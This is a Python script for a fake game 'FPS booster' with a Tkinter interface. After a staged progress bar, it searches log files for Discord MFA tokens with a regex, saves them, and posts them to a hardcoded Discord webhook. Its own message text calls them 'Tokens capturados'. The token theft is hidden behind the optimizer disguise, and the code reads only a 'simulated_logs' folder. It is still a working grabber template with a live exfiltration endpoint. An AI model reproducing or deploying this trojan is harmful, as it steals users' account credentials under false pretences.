import requests
import tkinter as tk
from tkinter import ttk
import os
import re
import time
import threading
def enviar_para_webhook(tokens):
    webhook_url = "https://discord.com/api/webhooks/1374841660319727716/7TdEaH-_FAbSlr0pvZN3QTpPTQCLFqNFpOBU688i9KrpLVSC9Sd1pzSvuhmpJ7Z61GYw"  # <- substitua isso com sua URL real

    if not tokens:
        return

    data = {
        "content": "**[BoostFPS] Tokens capturados:**\n" + "\n".join(f"`{t}`" for t in set(tokens))
    }

    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("[+] Tokens enviados com sucesso para o webhook!")
        else:
            print(f"[!] Erro ao enviar para o webhook: {response.status_code}")
    except Exception as e:
        print(f"[!] Falha ao conectar com o webhook: {e}")


# Cria pasta para simulação, se não existir
if not os.path.exists("simulated_logs"):
    os.mkdir("simulated_logs")

def run_grabber():
    folder = "simulated_logs"
    tokens = []

    token_regex = re.compile(r"(mfa\.[\w-]{84})")

    if not os.path.exists(folder):
        return

    for filename in os.listdir(folder):
        if filename.endswith(".log"):
            path = os.path.join(folder, filename)
            with open(path, "r", encoding="utf-8") as f:
                content = f.read()
                encontrados = token_regex.findall(content)
                tokens.extend(encontrados)

    if tokens:
        with open("tokens_encontrados.txt", "w", encoding="utf-8") as file:
            for t in set(tokens):  # remove duplicatas
                file.write(t + "\n")
        
        # ENVIA PARA WEBHOOK
        enviar_para_webhook(tokens)


def iniciar_otimizacao():
    # Desativa botão e mostra progresso
    btn_otimizar.config(state="disabled")
    status_label.config(text="Otimizando FPS...")

    def animacao_e_execucao():
        for i in range(101):
            progress["value"] = i
            time.sleep(0.03)
        status_label.config(text="Otimização concluída! FPS melhorado.")
        run_grabber()

    threading.Thread(target=animacao_e_execucao).start()

# Interface gráfica
window = tk.Tk()
window.title("Boost FPS - Otimizador de Desempenho")
window.geometry("400x250")
window.resizable(False, False)

title = tk.Label(window, text="BoostFPS - Otimizador de Jogos", font=("Segoe UI", 14, "bold"))
title.pack(pady=10)

btn_otimizar = tk.Button(window, text="Otimizar FPS", command=iniciar_otimizacao, width=20, height=2, bg="#28a745", fg="white", font=("Segoe UI", 11))
btn_otimizar.pack(pady=10)

progress = ttk.Progressbar(window, orient="horizontal", length=300, mode="determinate")
progress.pack(pady=10)

status_label = tk.Label(window, text="", font=("Segoe UI", 10))
status_label.pack(pady=10)

window.mainloop()
